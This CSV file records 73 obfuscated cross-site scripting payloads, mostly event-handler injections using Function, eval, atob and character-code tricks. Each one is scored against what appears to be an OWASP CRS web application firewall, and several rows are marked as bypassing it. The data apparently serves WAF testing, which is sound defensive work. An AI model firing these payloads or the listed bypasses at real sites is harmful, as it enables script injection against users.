index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1,"<audio src onerror=Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o27,55v221,88 || o29,5v221,88 || o27,5v221,88t:removeWhitespace || v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,5v221,88t:htmlEntityDecode,t:jsDecode || ",30,176482687756.979093
2,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');eval(a);})())""></audio>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o64,7v221,87 || o26,11v221,87 || o25,11v221,87t:removeWhitespace || v221,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,5v221,87t:htmlEntityDecode,t:jsDecode || ",30,176482688168.158787
3,"<details ontoggle=""(()=>{new Function('al'+'ert(1)')()})()"" open></details>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,75 || o25,13v221,75t:urlDecodeUni || v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,75t:htmlEntityDecode,t:jsDecode || ",25,176482688431.955270
4,<details ontoggle=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,5,"920540,941100,941160,941390,949110","v158,10o29,6v221,83 || v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,6v221,83t:htmlEntityDecode,t:jsDecode || ",20,176482688753.796890
5,<details ontoggle=(Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941160","v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482689024.110727
6,"<details ontoggle=(Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,0x31,41)))() open>",0,1,block,5,"934100,934100,941100,941160,949110","o28,19v221,94 || o27,19v221,94t:removeWhitespace || v221,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,176482689312.310501
7,<details ontoggle=(Function(atob('YWxlcnQoMSk=')))() open></details>,0,1,block,4,"941100,941160,941390,949110","v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,5v221,68t:htmlEntityDecode,t:jsDecode || ",15,176482689616.879790
8,<details ontoggle=(function(){window['ale'+'rt'](1)})() open>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o19,11v221,61 || o19,11v221,61t:urlDecodeUni || o18,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,18v221,61t:urlDecodeUni,t:compressWhitespace || ",30,176482689940.882935
9,<details ontoggle=Function(atob('YWxlcnQoMSk='))() open></details>,0,1,block,4,"941100,941160,941390,949110","v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,5v221,66t:htmlEntityDecode,t:jsDecode || ",15,176482690274.113473
10,"<details open ontoggle=""(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()""></details>",0,1,block,7,"920540,934100,934100,934100,941100,941370,949110","v158,10o52,6v221,113 || o25,11v221,113 || o25,11v221,113t:jsDecode || o23,11v221,113t:removeWhitespace || v221,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,20v221,113t:urlDecodeUni,t:compressWhitespace || ",30,176482690558.313063
11,"<details open ontoggle=""(function(){var a='a'+'lert';window[a](1)})();"">",0,1,block,6,"934100,934100,934100,941100,941370,949110","o25,11v221,72 || o25,11v221,72t:urlDecodeUni || o23,11v221,72t:removeWhitespace || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v221,72t:urlDecodeUni,t:compressWhitespace || ",25,176482690899.953952
12,"<details open ontoggle=""(function(){var a='al'+String.fromCharCode(101)+'rt';window[a](1);})();"">",0,1,block,6,"934100,934100,934100,941100,941370,949110","o25,11v221,97 || o25,11v221,97t:urlDecodeUni || o23,11v221,97t:removeWhitespace || v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v221,97t:urlDecodeUni,t:compressWhitespace || ",25,176482691119.530503
13,"<details open ontoggle=""(function(){var a='co';var b='nfirm';eval(a+b+'(1)')})()"">",0,1,block,7,"933160,934100,934100,934100,941100,941390,949110","o61,13v221,82 || o25,11v221,82 || o25,11v221,82t:urlDecodeUni || o23,11v221,82t:removeWhitespace || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,5v221,82t:htmlEntityDecode,t:jsDecode || ",30,176482691497.998841
14,"<details open ontoggle=""(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,107 || o23,11v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v221,107t:urlDecodeUni,t:compressWhitespace || ",20,176482691693.521133
15,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,104 || o23,11v221,104t:removeWhitespace || v221,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,104t:urlDecodeUni,t:compressWhitespace || ",20,17648269190.931171
16,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,102 || o23,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,102t:urlDecodeUni,t:compressWhitespace || ",20,176482692295.599163
17,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');window[a](1);})();"">",0,1,block,6,"934100,934100,941100,941370,941390,949110","o25,11v221,79 || o23,11v221,79t:removeWhitespace || v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v221,79t:urlDecodeUni,t:compressWhitespace || o42,5v221,79t:htmlEntityDecode,t:jsDecode || ",25,176482692561.468964
18,"<details open ontoggle=""(function(){var e=String.fromCharCode(97,108,101,114,116);window[e](7);})()""></details>",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,111 || o23,11v221,111t:removeWhitespace || v221,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,111t:urlDecodeUni,t:compressWhitespace || ",20,176482692875.158891
19,"<details open ontoggle=""(function(){var j=String.fromCharCode(97,108,101,114,116);window[j](14);})()""></details>",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,112 || o23,11v221,112t:removeWhitespace || v221,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,112t:urlDecodeUni,t:compressWhitespace || ",20,176482693124.524653
20,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);window[x](1);})()"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,101 || o23,11v221,101t:removeWhitespace || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,101t:urlDecodeUni,t:compressWhitespace || ",20,17648269344.325298
21,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');window[x](1);})()"">",0,1,block,6,"934100,934100,941100,941370,941390,949110","o25,11v221,78 || o23,11v221,78t:removeWhitespace || v221,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v221,78t:urlDecodeUni,t:compressWhitespace || o42,5v221,78t:htmlEntityDecode,t:jsDecode || ",25,176482693776.970966
22,"<details open ontoggle=""(function(){window['al'+'ert'](1)})()""></details>",0,1,block,6,"934100,934100,934100,941100,941370,949110","o25,11v221,73 || o25,11v221,73t:urlDecodeUni || o23,11v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,18v221,73t:urlDecodeUni,t:compressWhitespace || ",25,176482694061.569864
23,"<details open ontoggle=""(function(){with(this){eval('al'+'ert(1)')}})()"">",0,1,block,7,"933160,934100,934100,934100,941100,941390,949110","o47,17v221,73 || o25,11v221,73 || o25,11v221,73t:urlDecodeUni || o23,11v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,5v221,73t:htmlEntityDecode,t:jsDecode || ",30,176482694351.317219
24,"<details open ontoggle=""(new Function('al'+'ert(1)'))()""></details>",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,67 || o25,13v221,67t:urlDecodeUni || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,67t:htmlEntityDecode,t:jsDecode || ",20,176482694778.382438
25,"<details open ontoggle=""(new Function('ale'+'rt(2)'))()"">",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,57 || o25,13v221,57t:urlDecodeUni || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,57t:htmlEntityDecode,t:jsDecode || ",20,176482694992.737991
26,"<details open ontoggle=""(new Function('con'+'sol'+'e.log(\u0061\u006c\u0065\u0072\u0074(1))'))()""></details>",0,1,block,7,"920540,934100,934100,934100,941100,941390,949110","v158,10o57,6v221,108 || o25,13v221,108 || o25,13v221,108t:urlDecodeUni || o25,13v221,108t:jsDecode || v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,108t:htmlEntityDecode,t:jsDecode || ",30,176482695283.253944
27,"<details open ontoggle=""(new Function('return al'+'ert'))()('XSS')""></details>",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,78 || o25,13v221,78t:urlDecodeUni || v221,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,78t:htmlEntityDecode,t:jsDecode || ",20,176482695550.210227
28,"<details open ontoggle=""(new Function('return al'+'ert')).call()(2)"">",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,69 || o25,13v221,69t:urlDecodeUni || v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,69t:htmlEntityDecode,t:jsDecode || ",20,176482695836.503269
29,"<details open ontoggle=""(new Function('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,78 || o25,13v221,78t:urlDecodeUni || v221,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,78t:htmlEntityDecode,t:jsDecode || ",20,176482696140.678530
30,"<details open ontoggle=""(new Function(String.fromCharCode(97,108,101,114,116)+'(49)'))()"">",0,1,block,6,"934100,934100,934100,941100,941390,949110","o25,13v221,90 || o25,13v221,90t:urlDecodeUni || o35,19v221,90t:removeWhitespace || v221,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,90t:htmlEntityDecode,t:jsDecode || ",25,176482696462.827510
31,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,block,4,"920540,941100,941390,949110","v158,10o39,6v221,83 || v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,6v221,83t:htmlEntityDecode,t:jsDecode || ",15,176482696646.736411
32,"<details open ontoggle=""Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"941100,941390,942100,949110","v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,6v221,72t:htmlEntityDecode,t:jsDecode || v221,72 || ",15,176482696924.087931
33,"<details open ontoggle=""Function('al'+'ert(1)')()"">",0,1,block,4,"941100,942100,942100,949110","v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v220,51 || v220,51t:urlDecodeUni || ",15,176482697217.404026
34,"<details open ontoggle=""Function('al'+'ert(1)')()""></details>",0,1,block,4,"941100,942100,942100,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,61 || v221,61t:urlDecodeUni || ",15,176482697435.770113
35,"<details open ontoggle=""Function('ale'+'rt(1)')()""></details>",0,1,block,4,"941100,942100,942100,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,61 || v221,61t:urlDecodeUni || ",15,176482697794.461270
36,"<details open ontoggle=""Function('return eval')()(String.fromCharCode(97,108,101,114,116,40,49,41))"">",0,1,block,6,"933160,934100,934100,941100,942100,949110","o41,8v221,101 || o50,19v221,101 || o47,19v221,101t:removeWhitespace || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,101 || ",25,176482698055.260535
37,"<details open ontoggle=""Function('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941390,942100,949110","v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,5v221,76t:htmlEntityDecode,t:jsDecode || v221,76 || ",15,176482698349.119563
38,"<details open ontoggle=""new Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"934100,941100,941390,949110","o24,13v221,86 || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,86t:htmlEntityDecode,t:jsDecode || ",15,176482698664.971430
39,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074(29)')()""></details>",0,1,block,6,"920540,934100,934100,941100,941390,949110","v158,10o38,6v221,88 || o24,13v221,88 || o24,13v221,88t:jsDecode || v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,88t:htmlEntityDecode,t:jsDecode || ",25,176482698987.552713
40,"<details open ontoggle=""new Function('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v220,55 || o24,13v220,55t:urlDecodeUni || v220,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v220,55t:htmlEntityDecode,t:jsDecode || ",20,176482699294.767652
41,"<details open ontoggle=""new Function('al'+'ert(15)')()""></details>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,66 || o24,13v221,66t:urlDecodeUni || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,66t:htmlEntityDecode,t:jsDecode || ",20,176482699562.192943
42,"<details open ontoggle=""new Function('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,6,"934100,934100,934100,941100,941390,949110","o24,13v221,79 || o24,13v221,79t:urlDecodeUni || o38,19v221,79t:removeWhitespace || v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,79t:htmlEntityDecode,t:jsDecode || ",25,176482699849.158753
43,"<details open ontoggle=""new Function('ale'+'rt(1)')()""></details>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,65 || o24,13v221,65t:urlDecodeUni || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,65t:htmlEntityDecode,t:jsDecode || ",20,176482700224.567455
44,"<details open ontoggle=""new Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()"">",0,1,block,6,"933160,934100,934100,941100,941390,949110","o36,55v221,98 || o24,13v221,98 || o35,5v221,98t:removeWhitespace || v221,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,98t:htmlEntityDecode,t:jsDecode || ",25,176482700548.753531
45,"<details open ontoggle=""new Function('return ale'+String.fromCharCode(114,116))()(1)"">",0,1,block,6,"934100,934100,934100,941100,941390,949110","o24,13v221,86 || o24,13v221,86t:urlDecodeUni || o45,19v221,86t:removeWhitespace || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,86t:htmlEntityDecode,t:jsDecode || ",25,176482700892.667079
46,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116)+'(1)')()""></details>",0,1,block,6,"934100,934100,934100,941100,941390,949110","o24,13v221,97 || o24,13v221,97t:urlDecodeUni || o34,19v221,97t:removeWhitespace || v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,97t:htmlEntityDecode,t:jsDecode || ",25,176482701264.625452
47,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"934100,941100,941390,949110","o24,13v220,62 || v220,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v220,62t:htmlEntityDecode,t:jsDecode || ",15,176482701560.510401
48,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))()""></details>",0,1,block,4,"934100,941100,941390,949110","o24,13v221,72 || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,72t:htmlEntityDecode,t:jsDecode || ",15,17648270188.176961
49,"<details open ontoggle=""new Function(atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"934100,941100,941390,949110","o24,13v221,72 || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,72t:htmlEntityDecode,t:jsDecode || ",15,17648270213.320791
50,"<details open ontoggle=""new Function(atob('YWxlcnQoOCk='))()""></details>",0,1,block,4,"934100,941100,941390,949110","o24,13v221,72 || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,72t:htmlEntityDecode,t:jsDecode || ",15,176482702456.672019
51,"<details open ontoggle=""setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"933160,934100,934100,941100,941390,949110","o46,53v221,106 || o35,11v221,106 || o33,11v221,106t:removeWhitespace || v221,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,106t:htmlEntityDecode,t:jsDecode || ",25,176482702763.453766
52,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text='al\\u0065rt(1)';},0)"">",0,1,block,7,"920540,934100,934100,934100,941100,941390,949110","v158,10o116,6v221,135 || o35,11v221,135 || o35,11v221,135t:jsDecode || o33,11v221,135t:removeWhitespace || v221,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,135t:htmlEntityDecode,t:jsDecode || ",30,176482703042.499320
53,"<details open ontoggle=""var a=Function;new a(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941390","v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,5v221,70t:htmlEntityDecode,t:jsDecode",0,176482703331.030590
54,"<details open ontoggle='(Function(""al""+""ert(1)""))()'>",0,1,bypass,1,941100,"v220,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482703589.013363
55,"<details open ontoggle='(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,100 || o23,11v221,100t:removeWhitespace || v221,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,100t:urlDecodeUni,t:compressWhitespace || ",20,176482703811.413203
56,"<details open ontoggle='(function(){with(this)eval(""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933160,934100,934100,934100,941100,941390,949110","o46,17v221,81 || o25,11v221,81 || o25,11v221,81t:urlDecodeUni || o23,11v221,81t:removeWhitespace || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,5v221,81t:htmlEntityDecode,t:jsDecode || ",30,176482704196.156493
57,"<details open ontoggle='(new Function(""al""+""ert(1)""))()'></details>",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,67 || o25,13v221,67t:urlDecodeUni || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,67t:htmlEntityDecode,t:jsDecode || ",20,176482704333.158686
58,"<details open ontoggle='(new Function(""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"933160,934100,934100,941100,941390,949110","o50,60v221,120 || o25,13v221,120 || o46,5v221,120t:removeWhitespace || v221,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,120t:htmlEntityDecode,t:jsDecode || ",25,176482704615.704106
59,"<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,92 || o35,19v221,92t:removeWhitespace || v221,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,92t:htmlEntityDecode,t:jsDecode || ",20,17648270490.404873
60,"<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'></details>",0,1,block,5,"934100,934100,941100,941390,949110","o25,13v221,102 || o35,19v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,102t:htmlEntityDecode,t:jsDecode || ",20,176482705270.910570
61,<details open ontoggle='(new Function(\u0061\u006c\u0065\u0072\u0074(1)))()'>,0,1,block,6,"920540,934100,934100,941100,941390,949110","v158,10o38,6v221,77 || o25,13v221,77 || o25,13v221,77t:jsDecode || v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,77t:htmlEntityDecode,t:jsDecode || ",25,176482705518.940132
62,"<details open ontoggle='(new Function(atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"934100,941100,941390,949110","o25,13v221,64 || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,64t:htmlEntityDecode,t:jsDecode || ",15,17648270571.842669
63,"<details open ontoggle='Function(""al""+""ert(1)"")()'></details>",0,1,block,4,"941100,942100,942100,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,61 || v221,61t:urlDecodeUni || ",15,176482706065.038909
64,<details open ontoggle='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'>,0,1,bypass,2,"941100,941390","v221,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,6v221,94t:htmlEntityDecode,t:jsDecode",0,176482706338.125360
65,"<details open ontoggle='Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></details>",0,1,block,4,"934100,934100,941100,949110","o33,19v221,96 || o31,19v221,96t:removeWhitespace || v221,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17648270661.823338
66,"<details open ontoggle='Function(atob(""YWxlcnQoMSk=""))()'></details>",0,1,bypass,2,"941100,941390","v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,5v221,68t:htmlEntityDecode,t:jsDecode",0,176482706898.348003
67,"<details open ontoggle='Function(unescape(""%61%6C%65%72%74%28%31%29""))()'></details>",0,1,bypass,1,941100,"v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482707150.683095
68,"<details open ontoggle='new Function(""\\u0061\\u006c\\u0065\\u0072\\u0074(1)"")()'></details>",0,1,block,6,"920540,934100,934100,941100,941390,949110","v158,10o39,6v221,92 || o24,13v221,92 || o24,13v221,92t:jsDecode || v221,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,92t:htmlEntityDecode,t:jsDecode || ",25,176482707443.091908
69,"<details open ontoggle='new Function(""return al"" + ""ert"")(1)()'>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,64 || o24,13v221,64t:urlDecodeUni || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,64t:htmlEntityDecode,t:jsDecode || ",20,176482707766.761318
70,"<details open ontoggle='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,90 || o34,19v221,90t:removeWhitespace || v221,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,90t:htmlEntityDecode,t:jsDecode || ",20,176482707954.559602
71,<details open ontoggle='new Function(`\u0061lert(1)`)()'></details>,0,1,block,6,"920540,934100,934100,941100,941390,949110","v158,10o38,6v221,67 || o24,13v221,67 || o24,13v221,67t:jsDecode || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,67t:htmlEntityDecode,t:jsDecode || ",25,17648270825.633551
72,"<details open ontoggle=(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933160,934100,934100,941100,941390,949110","o35,53v221,95 || o24,11v221,95 || o22,11v221,95t:removeWhitespace || v221,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,5v221,95t:htmlEntityDecode,t:jsDecode || ",25,176482708582.541149
73,<details open ontoggle=(function(){eval(atob('YWxlcnQoMSk='))})()>,0,1,block,6,"933160,934100,934100,941100,941390,949110","o35,25v221,66 || o24,11v221,66 || o22,11v221,66t:removeWhitespace || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,5v221,66t:htmlEntityDecode,t:jsDecode || ",25,176482708836.487879
